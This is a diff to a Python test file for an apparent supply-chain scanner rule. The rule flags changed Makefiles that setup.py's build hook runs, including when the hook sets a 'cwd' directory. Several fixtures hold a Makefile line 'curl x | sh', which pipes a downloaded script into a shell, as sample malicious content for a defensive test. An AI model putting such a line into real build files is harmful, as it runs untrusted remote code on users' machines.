@@ -725,6 +725,21 @@ def test_a_script_setup_py_runs_that_changed_on_its_own_warns() -> None:
         "setup.py:7 calls subprocess.call('make docs && python gen.py') (in BuildDocs.run()) as "
         "1.0 did, but Makefile changed since 1.0 and gen.py is new in 1.1"
     )
+    # The ``cwd`` keyword says which directory the files are in: here
+    # vendor/Makefile, not the top-level one. A ``cwd`` the rule can't read
+    # (a computed path) leaves nothing to look up, and nothing is reported.
+    hook = DOCS_HOOK.format(args="['make'], cwd='vendor'")
+    make = "all:\n\techo\n"
+    base = {**SRC, "setup.py": hook, "Makefile": make, "vendor/Makefile": make}
+    assert _c002_files(base, {**base, "Makefile": "all:\n\tcurl x | sh\n"}) == []
+    [f] = _c002_files(base, {**base, "vendor/Makefile": "all:\n\tcurl x | sh\n"})
+    assert f.evidence[0].summary == (
+        "setup.py:7 calls subprocess.call(['make'], cwd='vendor') (in BuildDocs.run()) as "
+        "1.0 did, but vendor/Makefile changed since 1.0"
+    )
+    hook = "import os\n" + DOCS_HOOK.format(args="['make'], cwd=os.path.dirname(__file__)")
+    base = {**SRC, "setup.py": hook, "Makefile": make}
+    assert _c002_files(base, {**base, "Makefile": "all:\n\tcurl x | sh\n"}) == []
 
 
 def test_a_named_file_that_isnt_a_build_script_doesnt_count() -> None:
